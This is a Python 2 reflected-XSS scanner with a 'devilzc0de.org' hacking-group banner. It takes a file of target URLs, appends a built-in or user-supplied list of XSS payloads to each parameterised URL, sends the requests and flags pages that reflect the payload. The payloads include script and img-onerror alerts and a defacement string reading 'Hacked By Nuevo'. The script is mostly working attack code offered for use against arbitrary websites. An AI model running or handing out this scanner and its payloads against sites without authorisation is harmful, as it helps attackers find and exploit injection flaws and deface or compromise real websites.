import requests
import argparse
import re

print """
\t\t\t|-----------------------------------|
\t\t\t|          devilzc0de.org           |
\t\t\t|     We Are Coder And Exploiter    |
\t\t\t|                                   |
\t\t\t|  Web Scanner Project Version 0.3  |
\t\t\t|     Created By Nuevo Querto       |
\t\t\t|-----------------------------------|
"""

try:
	Parser = argparse.ArgumentParser(prog="Web.py", description="Untuk Scanning Website")

	Parser.add_argument("-u", "--url", help="Target Wordlists, Example: User/Target.txt", action="store", default=False, dest="Target")
	Parser.add_argument("--wordlist", help="Wordlists File, Example: User/wordlist.txt", action="store", default=False, dest="Wordlist")

	Args = Parser.parse_args()
	
	TargetWordlists = []
	
	XSS_Payload = []
	
	Default_Payload = ["<script>alert(1)</script>", "<img src=x onerror=alert(1) />", "\"><img src=x onerror=alert(1) />", 
		"'<1337 contenteditable onmouseover=prompt(document.domain) />", "\"><img src=x onerror=alert('XSS-By-Nuevo-Querto') />Nuevo/", "\"><img src=\"x\" onerror=\"alert(1);\" />",
		"\"><marquee><h1>Hacked By Nuevo</h1></marquee> />"
	] # Default XSS Payload
	
	if Args.Wordlist:
		with open(Args.Wordlist, "r+") as file:
			Read = file.read()
			Pisahkan = Read.split("\n")
		for i in range(len(Pisahkan)):
			Import_Payload = XSS_Payload.append("%s" %(Pisahkan[i]))
	else:
		for x in range(len(Default_Payload)):
			Import_Payload = XSS_Payload.append("%s" %(Default_Payload[x]))
		
	if Args.Target:
		with open(Args.Target, "r+") as file:
			Read = file.read()
			Pisahkan = Read.split("\n")
		for i in range(len(Pisahkan)):
			Import_Target = TargetWordlists.append("%s" %(Pisahkan[i]))
			Checking_Parameter = re.search(r"\?|=", TargetWordlists[i], re.M|re.I)
			print "\n\n\n" + "[ Target %s: " %(i + 1) + TargetWordlists[i] + " ]\n"
			if Checking_Parameter:
				for z in range(len(XSS_Payload)):
					InjectingPayload = TargetWordlists[i] + "%s" %(XSS_Payload[z]) # Injecting XSS Payload
					Request = requests.get(InjectingPayload)
					HTTPCode = Request.status_code
					Checking_Payload = re.search(re.escape(r"%s" %(XSS_Payload[z])), Request.text, re.M|re.I)
					
					print "Payload: " + InjectingPayload + " %s" %("[ Vuln To XSS ] [ %s ]\n" if Checking_Payload else "[ Not Vuln To XSS ] [ %s ]\n") %(HTTPCode)
			else:
				print TargetWordlists[i] + " -> Not Valid Target URL, Example http://target.com?id=1\n"
			print "[ -- ]"
	else:
		print "Use -h or --help for Help"
except IOError:
	print "File Tidak Ditemukan"
except KeyboardInterrupt:
	print "User Cancelling"
